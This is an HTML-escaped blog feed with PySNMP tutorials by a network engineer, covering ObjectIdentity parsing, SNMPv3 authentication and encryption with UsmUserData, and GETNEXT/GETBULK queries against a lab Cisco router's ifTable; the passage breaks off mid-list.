&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;oid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;suffix&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mib_view&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getNodeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;var_binds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&apos;1.3.6.1.2.1.47.1.1.1.1.2&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;iso&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;org&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;dod&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;internet&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;mgmt&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;mib-2&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;entityMIB&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;entityMIBObjects&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;entityPhysical&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;entPhysicalTable&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;entPhysicalEntry&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;entPhysicalDescr&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;suffix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&apos;1&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With the label we can extract that the response MIB variable binding was for entPhysicalDescr and it was for entPhysicalIndex number 1. In instances where you have many variables in the entPhysicalTable you will need to iterate over the var_binds response object that we queried using the bulkCmd and extract the last value of the label for each as well as the suffix by using the mib_view’s getNodeName() class function. The results can then be stored in a Python Dict or List so that you can later write the results where you are storing or reporting on them (e.g. a database, CSV file, etc.)&lt;/p&gt;

&lt;h2 id=&quot;a-complete-example&quot;&gt;A Complete Example&lt;/h2&gt;

&lt;p&gt;To see a complete example of using PySNMP’s bulkCmd, querying entPhysicalTable, parsing
the returned ObjectIdentities and building a hardware inventory report, check out my &lt;a href=&quot;https://github.com/brianyaklin/net-hw-inventory&quot;&gt;network hardware inventory&lt;/a&gt; project on Github!&lt;/p&gt;</content><author><name>Brian Yaklin</name></author><category term="Python" /><category term="Automation" /><category term="SNMP" /><summary type="html">After using SNMP to query a remote device for a particular ObjectType and getting the response ObjectType (which includes the MIB identity and the corresponding value), it is useful to be able to programmatically parse the PySNMP ObjectIdentity. This allows you to read the OID hierarchy and get a list human-readable MIB variable names for each node in the list.</summary></entry><entry><title type="html">Secure Queries with SNMPv3 and PySNMP</title><link href="http://localhost:4000/2022/01/19/secure-query-with-snmpv3-and-pysnmp.html" rel="alternate" type="text/html" title="Secure Queries with SNMPv3 and PySNMP" /><published>2022-01-19T00:00:00-07:00</published><updated>2022-01-19T00:00:00-07:00</updated><id>http://localhost:4000/2022/01/19/secure-query-with-snmpv3-and-pysnmp</id><content type="html" xml:base="http://localhost:4000/2022/01/19/secure-query-with-snmpv3-and-pysnmp.html">&lt;p&gt;The information obtained with SNMP from network devices ranges from being simple timeseries type data like interface metrics to complex and sensitive status information about the features and protocols that the device is running. It is critical to protect this information when in transit between an SNMP agent and manager by utilizing SNMPv3. Sensitive data from network devices being sent in SNMP responses can be used by malicious parties to perform reconnaissance about your environment, learn which protocols and features you utilize, and prepare for a more specific attack based on the information that is learned.&lt;/p&gt;

&lt;p&gt;The transit network between a network device that is being queried and the management stations performing the queries (where our Python code is located) often times runs over networks outside of an organizations control. MPLS networks, point-to-point circuits, etc. all are controlled by carriers and vendors and &lt;em&gt;you&lt;/em&gt; cannot guarantee the security of their environment. There are many ways in which you can protect the data that flows over these transits (e.g. IPSec), but often times may require complex design changes. While these types of design changes should be considered in the long-run, a quicker way of securing your SNMP queries is by utilizing SNMPv3.&lt;/p&gt;

&lt;h2 id=&quot;what-is-snmpv3&quot;&gt;What is SNMPv3?&lt;/h2&gt;

&lt;p&gt;SNMP v1 and v2c send query and response data in clear-text form (along with the community string, which is supposed to be privileged information!). Anyone that is able to snoop the SNMP packets is able to read the data that is being exchanged. SNMP v3 primary goal is security of the messages/data being exchanged between SNMP managers and agents. It accomplishes this through a few different means:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A user-based security model (USM) for securing SNMP messages with:
    &lt;ul&gt;
      &lt;li&gt;Authentication - Ensuring that whoever is sending an SNMP query is who they say they are&lt;/li&gt;
      &lt;li&gt;Encryption - Ensuring that the SNMP query and response have not been manipulated in transit&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;A view-based access control model (VACM) for authorizing SNMP users access to specific MIB’s on a network device&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;An additional aspect to SNMPv3’s security is the snmpEngineId which is an identifier which must be unique to each SNMP entity. The snmpEngineId value is used by SNMP systems to add protection against &lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc3414#section-1.5&quot;&gt;message replay, delay and redirection attacks&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Each networking manufacturer often defines a default snmpEngineId for each system, sometimes involving the systems MAC address to as to ensure uniqueness. This differs from vendor to vendor. Additionally, I have seen instances where a system two firewalls running in an active/standby cluster both utilize the same snmpEngineId by default which can cause issues for a network management platform trying to treat each system as a separate device. In most cases, networking vendors allow you to adjust the snmpEngineId manually to a value you choose.&lt;/p&gt;

&lt;h2 id=&quot;using-snmpv3-with-pysnmp&quot;&gt;Using SNMPv3 with PySNMP&lt;/h2&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;Pythons &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/&quot;&gt;PySNMP&lt;/a&gt; allows you to provide a UsmUserData object for the authData parameter of its command generators (&lt;a href=&quot;/2022/01/11/pysnmp-hlapi-overview.html&quot;&gt;getCmd&lt;/a&gt;, &lt;a href=&quot;/2022/01/16/bulk-data-gathering-with-pysnmp.html&quot;&gt;nextCmd and bulkCmd&lt;/a&gt;). In my previous articles covering these PySNMP command generators I used a CommunityData object which is used for SNMP v1 or v2c queries. In this article I will focus on creating a UsmUserData object and providing it to the getCmd command generator. We will be using both authentication and privacy&lt;/p&gt;

&lt;h3 id=&quot;example-network-device-snmpv3-configuration&quot;&gt;Example Network Device SNMPv3 Configuration&lt;/h3&gt;

&lt;p&gt;In the example that follows I am using a Cisco IOSv router deployed in a &lt;a href=&quot;https://developer.cisco.com/docs/modeling-labs/&quot;&gt;Cisco Modeling Labs&lt;/a&gt; (CML) virtual environment. The router is configured for SNMPv3 as follows:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;snmp-server group v3group v3 priv
snmp-server user snmpv3user v3group v3 auth sha myauthpassword priv aes 256 myprivpassword
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Generally speaking, the same SNMPv3 configuration (group, user and passphrases) would be configured across all, or a group of, network devices in your environment. There are all sorts of additional configuration that can be made to control which SNMP MIB views and SNMP contexts that the SNMP group has access to.&lt;/p&gt;

&lt;h3 id=&quot;generating-a-usmuserdata-object&quot;&gt;Generating a UsmUserData Object&lt;/h3&gt;

&lt;p&gt;PySNMP’s &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/docs/api-reference.html#user-based&quot;&gt;UsmUserData&lt;/a&gt; object is used to build SNMPv3 credentials. It takes the following parameters:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A username matching that which is configured on the Cisco router&lt;/li&gt;
  &lt;li&gt;An authentication protocol object and key&lt;/li&gt;
  &lt;li&gt;An privacy/encryption protocol object and key&lt;/li&gt;
&lt;/ul&gt;

&lt;p class=&quot;notice&quot;&gt;There are several additional parameters that UsmUserData takes, but they are not necessary for our SNMP queries and are outside the scope of this article.&lt;/p&gt;

&lt;p&gt;The authentication and encryption related parameters are actually considered optional. It depends entirely on if your network device is configured for no authentication or privacy (noAuthNoPriv), authentication (authNoPriv), or authentication and privacy (authPriv). The strongest form of security would be through using authentication and privacy together.&lt;/p&gt;

&lt;p&gt;To create a UsmUserData object that we can use against the network device in my example, we would define it as follows in Python:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pysnmp.hlapi&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UsmUserData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;usmHMACSHAAuthProtocol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; \
                         &lt;span class=&quot;n&quot;&gt;usmAesCfb256Protocol&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UsmUserData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;userName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;snmpv3user&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;authKey&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;myauthpassword&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;authProtocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usmHMACSHAAuthProtocol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;privKey&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;myprivpassword&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;privProtocol&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;usmAesCfb256Protocol&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Because my router is configured for SHA1, the authProtocol is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;usmHMACSHAAuthProtocol&lt;/code&gt;. Additionally, the router is using AES256 encryption for privacy so the privProtocol is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;usmAesCfb256Protocol&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Available authProtocol options in PySNMP are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;usmNoAuthProtocol (default is authKey not given)&lt;/li&gt;
  &lt;li&gt;usmHMACMD5AuthProtocol (default if authKey is given)&lt;/li&gt;
  &lt;li&gt;usmHMACSHAAuthProtocol&lt;/li&gt;
  &lt;li&gt;usmHMAC128SHA224AuthProtocol&lt;/li&gt;
  &lt;li&gt;usmHMAC192SHA256AuthProtocol&lt;/li&gt;
  &lt;li&gt;usmHMAC256SHA384AuthProtocol&lt;/li&gt;
  &lt;li&gt;usmHMAC384SHA512AuthProtocol&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Available privProtocol options in PySNMP are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;usmNoPrivProtocol (default is privhKey not given)&lt;/li&gt;
  &lt;li&gt;usmDESPrivProtocol (default if privKey is given)&lt;/li&gt;
  &lt;li&gt;usm3DESEDEPrivProtocol&lt;/li&gt;
  &lt;li&gt;usmAesCfb128Protocol&lt;/li&gt;
  &lt;li&gt;usmAesCfb192Protocol&lt;/li&gt;
  &lt;li&gt;usmAesCfb256Protocol&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;There are several additional parameters that UsmUserData takes, but they are not necessary for our SNMP queries and are outside the scope of this article.&lt;/p&gt;

&lt;h3 id=&quot;associating-usmuserdata-with-pysnmp-getcmd---send-a-query&quot;&gt;Associating UsmUserData with PySNMP getCmd - Send a Query!&lt;/h3&gt;

&lt;p&gt;Now that the UsmUserData object has been created and stored as a variable named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth&lt;/code&gt;, we can use that to send an SNMP query using the getCmd command generator:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pysnmp.hlapi&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SnmpEngine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UdpTransportTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ContextData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; \
                         &lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getCmd&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;getCmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;SnmpEngine&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;auth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;UdpTransportTarget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;192.168.11.201&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;161&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ContextData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ObjectType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ObjectIdentity&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;SNMPv2-MIB&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;sysName&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;errorIndication&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorStatus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorIndex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iterator&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p class=&quot;notice--info&quot;&gt;For additional information on what the above statements are doing, please reference my post on using &lt;a href=&quot;/2022/01/11/pysnmp-hlapi-overview.html&quot;&gt;Python and PySNMP’s HLAPI&lt;/a&gt; to send SNMP queries.&lt;/p&gt;

&lt;p&gt;In the above example, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth&lt;/code&gt; variable is passed as the second argument to getCmd. The outcome that we expect is that the remote device 192.168.11.201 (my Cisco IOSv lab router) accepted the authentication and privacy protocols and passphrases as well as the username. The contents of varBinds should be the router name:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;varBinds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;prettyPrint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&apos;SNMPv2-MIB::sysName.0 = Router1.lab.yaklin.ca&apos;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If you used an authentication protocol that the remote device doesn’t support (e.g. usmHMAC384SHA512AuthProtocol instead of usmHMACSHAAuthProtocol) or an incorrect authentication passphrase, the following errorIndication would be seen:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorIndication&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;WrongDigest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;Wrong SNMP PDU digest&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In performing two separate tests where I set an incorrect privacy protocol and then set an incorrect privacy passphrase (with the correct privacy protocol), I thought that my router would have indicated an incorrect protocol was used but instead it simply ignored the request and PySNMP waited to time the request out:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errorIndication&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;RequestTimedOut&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;No SNMP response received before timeout&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Brian Yaklin</name></author><category term="Python" /><category term="Automation" /><category term="SNMP" /><summary type="html">The information obtained with SNMP from network devices ranges from being simple timeseries type data like interface metrics to complex and sensitive status information about the features and protocols that the device is running. It is critical to protect this information when in transit between an SNMP agent and manager by utilizing SNMPv3. Sensitive data from network devices being sent in SNMP responses can be used by malicious parties to perform reconnaissance about your environment, learn which protocols and features you utilize, and prepare for a more specific attack based on the information that is learned.</summary></entry><entry><title type="html">Bulk Data Gathering with PySNMP nextCmd and bulkCmd</title><link href="http://localhost:4000/2022/01/16/bulk-data-gathering-with-pysnmp.html" rel="alternate" type="text/html" title="Bulk Data Gathering with PySNMP nextCmd and bulkCmd" /><published>2022-01-16T00:00:00-07:00</published><updated>2022-01-17T21:13:00-07:00</updated><id>http://localhost:4000/2022/01/16/bulk-data-gathering-with-pysnmp</id><content type="html" xml:base="http://localhost:4000/2022/01/16/bulk-data-gathering-with-pysnmp.html">&lt;p&gt;Up until now my articles (&lt;a href=&quot;/2022/01/11/pysnmp-hlapi-overview.html&quot;&gt;PySNMP HLAPI&lt;/a&gt;, &lt;a href=&quot;/2022/01/14/compiling-mibs-for-pysnmp.html&quot;&gt;Compiling MIB’s for PySNMP&lt;/a&gt;) have focused on using simple SNMP GET requests with PySNMP’s &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/docs/hlapi/v3arch/asyncore/sync/manager/cmdgen/getcmd.html&quot;&gt;getCmd&lt;/a&gt;. This works great for simple SNMP queries where you only need one piece of information. When performing gathering of larger data sets with SNMP, issuing single SNMP GET requests for each data point can be very inefficient. Often times you are limited by the latency that exists between the SNMP manager (your script/code) and the SNMP agent running on a network device. In this article we will explore PySNMP’s implementation of SNMP GET NEXT and GET BULK using the &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/docs/hlapi/v3arch/asyncore/sync/manager/cmdgen/nextcmd.html&quot;&gt;nextCmd&lt;/a&gt; and &lt;a href=&quot;https://pysnmp.readthedocs.io/en/latest/docs/hlapi/v3arch/asyncore/sync/manager/cmdgen/bulkcmd.html&quot;&gt;bulkCmd&lt;/a&gt; command generators and how to retrieve the ifTable table of data from an SNMP agent.&lt;/p&gt;

&lt;h2 id=&quot;what-is-iftable&quot;&gt;What is ifTable?&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;http://www.net-snmp.org/docs/mibs/interfaces.html&quot;&gt;ifTable&lt;/a&gt; is an SNMP table that represents the interfaces on a remote device (a Cisco router in this article) and meta-data associated with the interfaces. Each column of the table represents meta-data such as:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ifDescr - the description of the interface&lt;/li&gt;
  &lt;li&gt;ifType - the type of interface&lt;/li&gt;
  &lt;li&gt;ifMtu - the MTU of the interface&lt;/li&gt;
  &lt;li&gt;ifSpeed - the speed of the interface&lt;/li&gt;
  &lt;li&gt;ifPhysAddress - the MAC address of the interface (in the case of ethernet)&lt;/li&gt;
  &lt;li&gt;ifAdminStatus - the administrative status (e.g. up/down) of the interface&lt;/li&gt;
  &lt;li&gt;ifOperStatus - the operational status (e.g up/down/testing/unknown/notPresent, etc) of the interface&lt;/li&gt;
  &lt;li&gt;ifInOctets/ifOutOctets - the input and output octets on the interface&lt;/li&gt;
  &lt;li&gt;ifInErrors/ifOutErrors - the input and output errors on the interface&lt;/li&gt;
  &lt;li&gt;Many more! (refer to the ifTable link above for a complete list)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Each row of the table represents an interface on the device and is represented by an ifIndex integer value per interface. For example, ifIndex value of 1 is used for the interface with a description of GigabitEthernet0/0, a value of 2 for GigabitEthernet0/1, and so on.&lt;/p&gt;

&lt;p&gt;For devices with many interfaces (e.g. a modular or stacked switch), there can be several hundred interfaces with corresponding ifIndex values. You can imagine that querying each one of these interfaces with a SNMP GET request you will be issuing one request per interface per type of meta-data you wish to collect.&lt;/p&gt;

&lt;h2 id=&quot;snmp-getnext-requests-with-pysnmp-nextcmd&quot;&gt;SNMP GETNEXT Requests with PySNMP nextCmd()&lt;/h2&gt;

&lt;p&gt;When we used PySNMP’s getCmd() function in a (&lt;a href=&quot;/2022/01/11/pysnmp-hlapi-overview.html&quot;&gt;previous article&lt;/a&gt; you were expected to provide a MIB name, variable name, and an integer value representing an instance (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ObjectIdentity(&apos;SNMPv2-MIB&apos;, &apos;sysName&apos;, 0)&lt;/code&gt;). In some cases this works fine, but in the case of our ifTable example, how are we to know the instance number representing each case? This would mean establishing ObjectIdentity instances for each ifIndex value thats available, but often times we won’t know about these ahead of time. We can instead send an SNMP GETNEXT request which allows us to query for data where we may not know this index value, as well as get related sequential data.&lt;/p&gt;

&lt;p&gt;An SNMP GETNEXT command means that we query for a particular MIB variable instance and the SNMP agent on the remote device will respond not an answer for the OID in the request, but with the OID and value for the &lt;em&gt;next&lt;/em&gt; variable in the MIB tree. This works well when querying a table where we may not know what the starting instance index is, because we can start with the MIB variable of the table itself (e.g. ifTable by specifying a PySNMP ObjectType of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ObjectType(ObjectIdentity(&apos;IF-MIB&apos;, &apos;ifTable&apos;))&lt;/code&gt;) and the SNMP avent on the remote device responds with the next available variable in the MIB tree.&lt;/p&gt;

&lt;p&gt;To explain this behavior further refer to the below image.&lt;/p&gt;

&lt;figure class=&quot;align-center&quot;&gt;
  &lt;img src=&quot;http://localhost:4000/assets/images/wshark-snmp-packet-1.png&quot; alt=&quot;wireshark-captured-snmp-next-packets&quot; /&gt;
  &lt;figcaption&gt;SNMP GETNEXT packet behavior.&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;In the above example we can see the following:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;In packet 1 an SNMP GETNEXT query was issued for OID 1.3.6.1.2.1.2.2 which was sent using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ObjectType(ObjectIdentity(&apos;IF-MIB&apos;, &apos;ifTable&apos;))&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;In packet 2 an SNMP get-response of 1.3.6.1.2.1.2.2.1.1.1 was returned which when reviewing the response PySNMP ObjectType instance it is for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IF-MIB::ifIndex.1 = 1&lt;/code&gt;. This is the first entry underneath ifTable which indicates that there is an index instance of 1 for ifIndex.1&lt;/li&gt;
  &lt;li&gt;In packet 3 an SNMP GETNEXT query was issued for OID 1.3.6.1.2.1.2.2.1.1.1. This at first might seem odd, because its actually the OID that was returned in packet 2. But this is the behavior of SNMP GETNEXT requests; a response packet tells the SNMP manager (your code) what to query next&lt;/li&gt;
